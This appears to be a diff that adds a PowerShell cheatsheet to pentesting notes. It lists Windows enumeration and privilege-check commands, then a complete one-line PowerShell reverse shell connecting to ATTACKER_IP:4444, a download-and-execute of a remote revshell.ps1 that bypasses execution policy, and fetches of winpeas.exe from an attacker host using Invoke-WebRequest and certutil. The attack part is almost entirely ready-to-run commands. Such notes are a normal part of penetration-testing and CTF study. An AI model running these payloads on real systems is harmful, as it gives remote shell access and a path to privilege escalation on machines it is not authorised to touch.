@@ -81,5 +81,81 @@ TAG            FUNCTION
 Syntax: smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]
 
 Example: smbclient //10.10.10.10/secrets -U Anonymous -p 445
+# Powershell cheatsheet
+##Recon and Enumeration
+# Get system info
+systeminfo
 
+# List local users
+Get-LocalUser
+
+# List local groups
+Get-LocalGroup
+
+# Show group members
+Get-LocalGroupMember -Group "Administrators"
+
+# Check current user
+whoami
+$env:USERNAME
+
+# List running processes
+Get-Process
+
+# List services
+Get-Service
+
+# Network info
+ipconfig /all
+Get-NetIPAddress
+
+# Firewall rules
+Get-NetFirewallRule | Format-Table Name, Enabled, Direction, Action
+
+# ARP table
+arp -a
+
+# Open ports and connections
+netstat -ano
+# File and dictionary commands
+# List files
+Get-ChildItem
+ls
+
+# Change directory
+Set-Location "C:\Users\Public"
+
+# Read file
+Get-Content filename.txt
+
+# Copy file
+Copy-Item file.txt -Destination C:\Temp
+
+# Download file
+Invoke-WebRequest -Uri "http://<attacker-ip>/winpeas.exe" -OutFile "C:\Users\Public\winpeas.exe"
+
+#user and privilege checks
+# Who am I
+whoami /priv
+
+# List user groups
+whoami /groups
+
+# Check admin rights
+net session  # If Access Denied → not admin
+#Execution and Reverse shell
+# Execute file
+Start-Process "C:\Users\Public\winpeas.exe"
+
+# PowerShell reverse shell (basic)
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+
+# Or download & execute reverse shell script
+Invoke-WebRequest "http://ATTACKER_IP/revshell.ps1" -OutFile "C:\Users\Public\rs.ps1"
+powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\rs.ps1"
+#Downloading Winpeas to victim
+Invoke-WebRequest -Uri "http://<attacker-ip>:8000/winpeas.exe" -OutFile "C:\Users\Public\winpeas.exe"
+
+#option 2 using certtuil
+certutil -urlcache -split -f "http://<attacker-ip>:8000/winpeas.exe" winpeas.exe
 
